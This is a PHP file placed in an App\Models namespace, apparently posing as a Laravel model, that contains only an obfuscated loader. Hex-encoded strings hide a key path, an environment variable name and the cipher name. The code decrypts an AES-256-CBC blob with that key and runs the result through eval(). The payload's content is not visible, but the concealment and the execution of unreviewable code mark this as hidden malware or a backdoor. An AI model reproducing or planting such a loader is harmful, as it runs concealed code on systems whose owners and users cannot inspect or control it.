<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('YsxAyQPS09y1z1MhuOfqSQ==');

$c=base64_decode(

'aM/fi0P/fhuHCRDHCblxLyV7TaVLieN6q2A+TG02COHJCw5ZXlyA7Fr2MdxAdJzIHM0S2ggxL2Q4' .
'2uK4PIB8S4kajEn3ypelGyqsNLxGYrqMYiLQrmCmlm1MMhCUHXpDTD50FrQ4qHGb6dlWd8+Ilg0Q' .
'6PXlz8xs4h2S44HLge1MLnsbJ3k7sfsvYqum3nhrxkPDmjZCa0chuNDBMRqmT2QAybIG6oiiLFIU' .
'LIQUTa319Yz2Wqf/NzeCyKLQGWCJyXRLMC9kKopUG/UwDgUSNdpfAIG+lmU4VBlJRPJL/pVZmtSs' .
'mcvzBYtVQFtuFzYWUhFCGRGmnN+VFIzRBlf50rHdv8pkJTohUH2fBNvvy03eF81/CicNdpOibjhJ' .
'izEcrNeWJEOUiW8ozKk8GhQApBCgZhpAtgC2Lne+7lWkOOI4Rpc3mjedzKTsNo0+8N4bS7Yf+UZO' .
'6blbFRfacNgJ3jlPMgvVkNgUgxFpQH+ovLwXiIhpdIxCKcsI5aiI+GUpAeNwei98ut2nzXbWWv56' .
'IaGfxkRYbTO2EayOvBkaqiEs2gHv+tmoIlV37Y7I9ZLGjHQ4hU0AhJLXUCH5tbf1UY9AE3195rZV' .
'cWdYtAhXDBteI36pOIqvpgp3BAoED/8xCuBE9X0K6trHGV6hTzHK57MBMYnsLuR1k+B/EWNqwYnX' .
'TtRP4jF6ApZllQL1VH34o4jvQfsDgKycq7bpaYmEBpi15F1Pq14iCwBcsI5y8+8JsIY0jFBrDGdF' .
'Z7hXrQtB++b9f2QfMFQuZr+sFgfmyA=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

